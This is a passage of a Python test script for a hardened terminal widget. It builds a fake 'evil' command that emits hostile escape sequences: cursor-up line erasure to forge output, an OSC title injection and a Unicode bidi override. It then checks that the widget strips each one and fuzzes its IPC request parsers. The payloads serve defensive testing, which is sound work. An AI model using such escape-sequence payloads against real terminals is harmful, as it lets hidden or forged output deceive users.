             "printf '\\033[1A\\033[2KHIDDEN_FAKE\\n'\n"   # up+erase the line above
             "printf '\\033]0;pwned\\007visible-text\\n'\n"  # OSC title injection
             "printf 'admin \\342\\200\\256nimda\\342\\200\\254 bidi\\n'\n"
             'sleep 30\n')
os.chmod(_evil, 0o755)
ssh = SecureTerminal(command=_evil)          # stands in for: ssh host cat evil
ssh.resize(700, 300)
ssh.show()
pump(500)
_doc = ssh.toPlainText()
ok('\x1b' not in _doc, 'ssh/cat: no escape byte survives to the document')
ok('\x9b' not in _doc and '\x07' not in _doc, 'ssh/cat: no C1 / BEL survives')
ok(chr(0x202e) not in _doc, 'ssh/cat: the bidi override is neutralized')
# the cursor-UP is stripped, so the forgery cannot reach the EARLIER line: the
# real output survives (a program can only rewrite its own current line).
ok('SECRET_REAL_OUTPUT' in _doc,
   'ssh/cat: cross-line forgery prevented (cursor-up cannot hide earlier output)')
ok('visible-text' in _doc, 'ssh/cat: honest visible text is shown')
# the OSC title payload is stripped whole -- it never reaches the document
ok('pwned' not in _doc, 'ssh/cat: the OSC-0 title-injection payload is stripped')
ssh.shutdown()

# --- fuzz the Qt-side request parsers (owner-only socket, but still defensive) -
from hypothesis import given as _given, strategies as _hst   # noqa: E402
from hypothesis import settings as _hset                     # noqa: E402
from secure_terminal.main import _sanitize_tab_spec          # noqa: E402
_HRUN = _hset(max_examples=150, deadline=None)


@_HRUN
@_given(_hst.dictionaries(
    _hst.text(max_size=12),
    _hst.one_of(_hst.none(), _hst.text(max_size=32), _hst.booleans(),
                _hst.integers(), _hst.lists(_hst.text(max_size=8), max_size=4))))
def _fuzz_tab_spec(spec):
    out = _sanitize_tab_spec(spec)
    assert set(out) == {'title', 'tui', 'mode', 'command'}
    assert out['title'] is None or isinstance(out['title'], str)
    assert out['tui'] is None or isinstance(out['tui'], bool)
    assert out['mode'] is None or isinstance(out['mode'], str)


try:
    _fuzz_tab_spec()
    ok(True, 'fuzz: _sanitize_tab_spec validates arbitrary IPC tab specs')
except Exception as _e:                # pylint: disable=broad-except
    ok(False, 'fuzz: _sanitize_tab_spec raised: %s' % _e)

_fw = MainWindow(launch=_pla([]))


@_HRUN
@_given(_hst.binary(max_size=256))
def _fuzz_dispatch(payload):
    reply = _fw._dispatch_request(payload)
    assert isinstance(reply, dict) and 'ok' in reply


try:
    _fuzz_dispatch()
    ok(True, 'fuzz: _dispatch_request handles arbitrary IPC bytes without crashing')
except Exception as _e:                # pylint: disable=broad-except
    ok(False, 'fuzz: _dispatch_request raised: %s' % _e)
_fw.close()

# --- result -------------------------------------------------------------------
sys.stdout.write('secure-terminal-tests(widget): %d passed, %d failed\n'
                 % (PASS, FAIL))
sys.exit(0 if FAIL == 0 else 1)
